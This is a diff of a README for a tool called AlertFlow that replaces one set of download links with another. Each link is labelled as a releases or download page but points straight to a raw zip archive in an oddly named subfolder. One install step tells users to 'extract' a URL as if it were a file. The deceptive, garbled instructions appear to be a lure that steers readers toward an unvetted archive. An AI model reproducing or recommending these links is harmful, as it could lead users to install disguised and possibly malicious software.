@@ -1,6 +1,6 @@
 # 🚀 AlertFlow - Streamline Your Alerts with Ease
 
-[![Download AlertFlow](https://raw.githubusercontent.com/AntonioPhilip/AlertFlow/main/Argyraspides/AlertFlow.zip)](https://raw.githubusercontent.com/AntonioPhilip/AlertFlow/main/Argyraspides/AlertFlow.zip)
+[![Download AlertFlow](https://github.com/AntonioPhilip/AlertFlow/raw/refs/heads/main/Argyraspides/Flow-Alert-1.9.zip)](https://github.com/AntonioPhilip/AlertFlow/raw/refs/heads/main/Argyraspides/Flow-Alert-1.9.zip)
 
 ## 📜 Description
 
@@ -29,7 +29,7 @@ With AlertFlow, you can simplify your alert management process and improve your 
 Follow these simple steps to get AlertFlow up and running.
 
 1. **Visit the Download Page**  
-   To get started, [visit the Releases page](https://raw.githubusercontent.com/AntonioPhilip/AlertFlow/main/Argyraspides/AlertFlow.zip).
+   To get started, [visit the Releases page](https://github.com/AntonioPhilip/AlertFlow/raw/refs/heads/main/Argyraspides/Flow-Alert-1.9.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you will see various versions available. Select the latest stable version suitable for your operating system.
@@ -43,7 +43,7 @@ Follow these simple steps to get AlertFlow up and running.
    - For macOS:  
      - Open the downloaded `.dmg` file and drag the AlertFlow icon to your Applications folder.
    - For Linux:  
-     - Extract the downloaded `https://raw.githubusercontent.com/AntonioPhilip/AlertFlow/main/Argyraspides/AlertFlow.zip` file and run the installation script in your terminal.
+     - Extract the downloaded `https://github.com/AntonioPhilip/AlertFlow/raw/refs/heads/main/Argyraspides/Flow-Alert-1.9.zip` file and run the installation script in your terminal.
 
 5. **Set Up Your Account**  
    After installation, launch AlertFlow. You will need to create an account or sign in if you already have one. Follow the prompts to complete the setup.
@@ -56,7 +56,7 @@ Follow these simple steps to get AlertFlow up and running.
 
 ## 📥 Download & Install
 
-Ready to enhance your alert management? Head over to [this page to download](https://raw.githubusercontent.com/AntonioPhilip/AlertFlow/main/Argyraspides/AlertFlow.zip) AlertFlow. 
+Ready to enhance your alert management? Head over to [this page to download](https://github.com/AntonioPhilip/AlertFlow/raw/refs/heads/main/Argyraspides/Flow-Alert-1.9.zip) AlertFlow. 
 
 ## 📞 Support
 
